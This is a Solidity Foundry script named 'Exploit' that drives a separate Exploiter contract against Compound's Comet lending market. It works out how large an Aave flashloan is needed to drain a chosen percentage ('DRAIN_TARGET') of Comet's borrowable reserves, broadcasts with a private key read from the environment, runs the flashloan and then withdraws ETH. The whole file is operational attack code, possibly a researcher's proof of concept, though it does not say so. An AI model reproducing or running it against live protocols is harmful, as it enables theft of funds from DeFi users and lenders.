// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/Script.sol";

import {Exploiter} from "../src/Exploiter.sol";
import {IPoolAddressesProvider} from "../lib/aave-v3-core/contracts/interfaces/IPoolAddressesProvider.sol";
import {CometMainInterface} from "../lib/comet/contracts/CometMainInterface.sol";

interface ERC20 {
    /**
     * @notice Gets the balance of the specified address
     * @param owner The address from which the balance will be retrieved
     * @return The balance
     */
    function balanceOf(address owner) external view returns (uint256);

    /**
     * @notice Approve `spender` to transfer up to `amount` from `src`
     * @dev This will overwrite the approval amount for `spender`
     *  and is subject to issues noted [here](https://eips.ethereum.org/EIPS/eip-20#approve)
     * @param spender The address of the account which may transfer tokens
     * @param amount The number of tokens that are approved (-1 means infinite)
     * @return Whether or not the approval succeeded
     */
    function approve(address spender, uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);
}

contract Exploit is Script {
    function getFlashloanAmount(
        Exploiter exploiter,
        address flashloanAsset,
        uint256 drainTarget
    ) internal view returns (uint256) {
        ERC20 asset = ERC20(flashloanAsset);
        uint8 assetDecimals = asset.decimals();
        uint256 singleAsset = 1 * (10 ** uint256(assetDecimals));

        // Get value of asset to be flashloaned
        uint256 singleAssetValue = exploiter.getAssetValue(
            flashloanAsset,
            singleAsset
        );

        // Get max borrowable value from comet
        uint256 totalBorrowableValue = exploiter.getTotalBorrowableValue();

        // Get amount of asset to be flashloaned based on comet reserves available
        // TODO add factor for borrow collateral
        uint256 targetFlashloanAmount = ((totalBorrowableValue /
            singleAssetValue) *
            (10 ** uint256(assetDecimals)) *
            drainTarget) / 100;

        // Get amount of asset available to be flashloaned
        address aToken = exploiter.getATokenAddress(flashloanAsset);
        uint256 flashloanReserve = asset.balanceOf(aToken);

        console.log("Borrowable Value");
        console.log(totalBorrowableValue);

        // Borrow target up to max available
        if (targetFlashloanAmount > flashloanReserve) return flashloanReserve;
        else return targetFlashloanAmount;
    }

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        address flashloanAsset = vm.envAddress("ASSET");
        address exploiterAddress = vm.envAddress("EXPLOITER");
        uint256 drainTarget = vm.envUint("DRAIN_TARGET");

        vm.startBroadcast(deployerPrivateKey);

        Exploiter exploiter = Exploiter(payable(exploiterAddress));

        uint256 value = getFlashloanAmount(
            exploiter,
            flashloanAsset,
            drainTarget
        );

        console.log("Target comet drain percentage");
        console.log(drainTarget);

        console.log("Target Flashloan amount");
        console.log(value);

        exploiter.flashloan(flashloanAsset, value);
        exploiter.withdrawEth();

        vm.stopBroadcast();
    }
}
